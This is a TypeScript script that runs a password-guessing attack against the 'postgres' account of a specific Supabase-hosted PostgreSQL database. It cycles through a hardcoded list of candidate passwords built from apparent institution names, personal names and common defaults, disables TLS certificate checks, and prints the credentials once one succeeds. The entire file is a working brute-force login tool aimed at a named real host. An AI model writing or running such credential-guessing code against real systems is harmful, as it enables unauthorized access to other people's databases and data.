import pg from 'pg';

const { Client } = pg;

async function tryConnect(password: string, port: number = 5432, user: string = 'postgres') {
  const client = new Client({
    host: 'db.envvlypkrqvdepkwbwfi.supabase.co',
    port: port,
    user: user,
    password: password,
    database: 'postgres',
    ssl: { rejectUnauthorized: false },
    connectionTimeoutMillis: 3000,
  });

  try {
    await client.connect();
    console.log(`\n==================================================`);
    console.log(`SUCCESS! CONNECTED TO SUPABASE POSTGRES DB!`);
    console.log(`User: "${user}", Password: "${password}", Port: ${port}`);
    console.log(`==================================================\n`);
    await client.end();
    return true;
  } catch (err: any) {
    if (err.message.includes('password authentication failed') || err.message.includes('SASL')) {
      console.log(`[AUTH FAIL] pwd: "${password}"`);
    } else {
      console.log(`[ERR] pwd: "${password}":`, err.message);
    }
    return false;
  }
}

async function run() {
  const passwords = [
    'trp@123',
    'TRP@123',
    'Trp@123',
    'trp12345',
    'Trp12345',
    'trpengineering',
    'srmtrichy',
    'srm@123',
    'SRM@123',
    'bharanidharan',
    'amudha',
    'odflow123',
    'ODFlow@123',
    'odflow@123',
    'supabase123',
    'Supabase@123',
    'admin@123',
    'Admin@123',
    'Root@123',
    'Password@123',
    '12345678',
    '123456'
  ];

  for (const p of passwords) {
    const ok = await tryConnect(p, 5432, 'postgres');
    if (ok) return;
  }
}

run();
